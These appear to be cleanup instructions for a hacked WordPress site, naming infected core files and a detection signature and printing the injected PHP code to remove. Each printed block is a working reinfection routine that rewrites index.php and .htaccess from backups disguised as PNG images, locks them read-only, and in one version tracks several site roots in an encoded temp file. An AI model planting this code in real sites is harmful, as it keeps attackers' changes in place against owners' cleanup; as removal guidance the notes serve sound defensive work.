wp-includes/cron.php
SMW-INJ-21060-php.bkdr.drpr-0

Remove the below code

$index = $_SERVER['DOCUMENT_ROOT'].'/index.php'; $ht = $_SERVER['DOCUMENT_ROOT'].'/.htaccess'; $bkindex = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/blocks/usleep.png'; $bkht = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/blocks/usort.png'; if($index && file_exists($bkindex)){ if(!file_exists($index) or (filesize($index) != filesize($bkindex))){ @chmod($index,0644); @file_put_contents($index,file_get_contents($bkindex)); @chmod($index,0444); } } if($ht && file_exists($bkht)){ if(!file_exists($ht) or (filesize($ht) != filesize($bkht))){ @chmod($ht,0644); @file_put_contents($ht,file_get_contents($bkht)); @chmod($ht,0444); } }

****************************************************************

cron.php -> 2
SMW-INJ-21060-php.bkdr.drpr-0

Remove the below code

if(function_exists('sys_get_temp_dir')){
		$tmpDir = sys_get_temp_dir();
	}elseif(is_dir('/tmp') && is_writeable('/tmp')){
		$tmpDir = '/tmp';
	}else{
		$temp = tempnam('', '');
		if (file_exists($temp)) {
			unlink($temp);
			$tmpDir = dirname($temp);
		}
	}
	$filePathList = $tmpDir . '/' . md5('pathlist');
	if(file_exists($filePathList)){
		$arrPath = json_decode(gzinflate(base64_decode(file_get_contents($filePathList))), true);
		if(!in_array($_SERVER['DOCUMENT_ROOT'], $arrPath)){
			$arrPath[] = $_SERVER['DOCUMENT_ROOT'];
			file_put_contents($filePathList, base64_encode(gzdeflate(json_encode($arrPath))));
		}
	}else{
		$arrPath[] = $_SERVER['DOCUMENT_ROOT'];
		file_put_contents($filePathList, base64_encode(gzdeflate(json_encode($arrPath))));
	}
	foreach($arrPath as $path){
		$index = $path.'/index.php';
		$ht = $path.'/.htaccess';
		$bkindex = $path.'/wp-admin/images/resize-6x.png';
		$bkht = $path.'/wp-admin/images/resize-8x.png';
		if($index && file_exists($bkindex)){
			if(!file_exists($index) or (md5_file($index) != md5_file($bkindex))){
				@chmod($index,0666);
				@file_put_contents($index,file_get_contents($bkindex));
				@chmod($index,0444);
			}
		}
		if($ht && file_exists($bkht)){
			if(!file_exists($ht) or (md5_file($ht) != md5_file($bkht))){
				@chmod($ht,0666);
				@file_put_contents($ht,file_get_contents($bkht));
				@chmod($ht,0444);
			}
		}
	}

*********************************************************************

wp-includes/query.php
SMW-INJ-21060-php.bkdr.drpr-0

Remove the below code

$index = $_SERVER['DOCUMENT_ROOT'].'/index.php';
$ht = $_SERVER['DOCUMENT_ROOT'].'/.htaccess';
$bkindex = $_SERVER['DOCUMENT_ROOT'].'/wp-admin/images/stars-6x.png';
$bkht = $_SERVER['DOCUMENT_ROOT'].'/wp-admin/images/stars-8x.png';
if($index && file_exists($bkindex)){
	if(!file_exists($index) or (filesize($index) != filesize($bkindex))){
		
		@chmod($index,0644);
		@file_put_contents($index,file_get_contents($bkindex));
		@chmod($index,0444);
	}
}
if($ht && file_exists($bkht)){
	if(!file_exists($ht) or (filesize($ht) != filesize($bkht))){
		
		@chmod($ht,0644);
		@file_put_contents($ht,file_get_contents($bkht));
		@chmod($ht,0444);
	}
}
